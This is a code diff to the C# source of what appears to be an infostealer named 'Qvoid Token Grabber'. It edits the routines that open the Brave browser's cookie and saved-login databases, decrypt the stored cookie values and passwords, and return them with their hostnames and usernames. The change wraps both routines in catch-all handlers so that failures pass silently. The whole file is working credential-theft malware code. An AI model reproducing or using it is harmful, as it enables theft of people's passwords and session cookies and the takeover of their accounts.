@@ -1,4 +1,4 @@
-﻿using Newtonsoft.Json.Linq;
+using Newtonsoft.Json.Linq;
 using Org.BouncyCastle.Crypto;
 using Org.BouncyCastle.Crypto.Engines;
 using Org.BouncyCastle.Crypto.Modes;
@@ -63,30 +63,34 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
         }
         public List<Cookie> GetAllCookies(byte[] key)
         {
-            List<Cookie> cookies = new List<Cookie>();
-            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", BraveCookiePath);  // throw FileNotFoundException if "Brave\User Data\Default\Cookies" not found
-
-            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={BraveCookiePath};pooling=false"))
-            using (var cmd = conn.CreateCommand())
+            try
             {
-                cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";
+                List<Cookie> cookies = new List<Cookie>();
+                if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", BraveCookiePath);  // throw FileNotFoundException if "Brave\User Data\Default\Cookies" not found
 
-                conn.Open();
-                using (var reader = cmd.ExecuteReader())
+                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={BraveCookiePath};pooling=false"))
+                using (var cmd = conn.CreateCommand())
                 {
-                    while (reader.Read())
+                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";
+
+                    conn.Open();
+                    using (var reader = cmd.ExecuteReader())
                     {
-                        cookies.Add(new Cookie()
+                        while (reader.Read())
                         {
-                            Name = reader.GetString(0),
-                            Value = DecryptWithKey((byte[])reader[1], key, 3),
-                            HostName = reader.GetString(2)
-                        });
+                            cookies.Add(new Cookie()
+                            {
+                                Name = reader.GetString(0),
+                                Value = DecryptWithKey((byte[])reader[1], key, 3),
+                                HostName = reader.GetString(2)
+                            });
+                        }
                     }
+                    conn.Close();
                 }
-                conn.Close();
+                return cookies;
             }
-            return cookies;
+            catch { return null; }
         }
 
         public List<Passwords> GetPasswordByHostname(string hostName, byte[] key)
@@ -119,30 +123,34 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
         }
         public List<Passwords> GetAllPasswords(byte[] key)
         {
-            List<Passwords> password = new List<Passwords>();
-            if (!PasswordsExists()) throw new FileNotFoundException("Cant find password store", BraveCookiePath);  // throw FileNotFoundException if "Brave\User Data\Default\Cookies" not found
-
-            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={BravePasswordPath};pooling=false"))
-            using (var cmd = conn.CreateCommand())
+            try
             {
-                cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+                List<Passwords> password = new List<Passwords>();
+                if (!PasswordsExists()) throw new FileNotFoundException("Cant find password store", BraveCookiePath);  // throw FileNotFoundException if "Brave\User Data\Default\Cookies" not found
 
-                conn.Open();
-                using (var reader = cmd.ExecuteReader())
+                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={BravePasswordPath};pooling=false"))
+                using (var cmd = conn.CreateCommand())
                 {
-                    while (reader.Read())
+                    cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+
+                    conn.Open();
+                    using (var reader = cmd.ExecuteReader())
                     {
-                        password.Add(new Passwords()
+                        while (reader.Read())
                         {
-                            url = reader.GetString(0),
-                            password = DecryptWithKey((byte[])reader[2], key, 3),
-                            username = reader.GetString(1)
-                        });
+                            password.Add(new Passwords()
+                            {
+                                url = reader.GetString(0),
+                                password = DecryptWithKey((byte[])reader[2], key, 3),
+                                username = reader.GetString(1)
+                            });
+                        }
                     }
+                    conn.Close();
                 }
-                conn.Close();
+                return password;
             }
-            return password;
+            catch { return null; }
         }
 
 
